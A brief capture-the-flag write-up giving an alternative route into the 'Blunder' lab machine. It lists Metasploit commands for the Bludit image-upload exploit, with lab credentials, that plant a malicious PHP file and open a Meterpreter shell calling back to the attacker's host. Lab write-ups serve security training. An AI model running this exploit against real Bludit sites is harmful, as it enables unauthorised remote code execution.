# Alternative way to exploit Blunder

## Exploiting Bludit

After getting access to the **Bludit** dashboard and searching for vulnerabilities, the same vulnerability as in the initial write-up exists as a **Metasploit** module:

```
msf6 > use exploit/linux/http/bludit_upload_images_exec

msf6 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
msf6 exploit(linux/http/bludit_upload_images_exec) > set LHOST tun0

msf6 exploit(linux/http/bludit_upload_images_exec) > run
```

This uploads a malicious PHP file into _/bl-content/tmp_ and starts a **Meterpreter** session on the box as _www-data_.
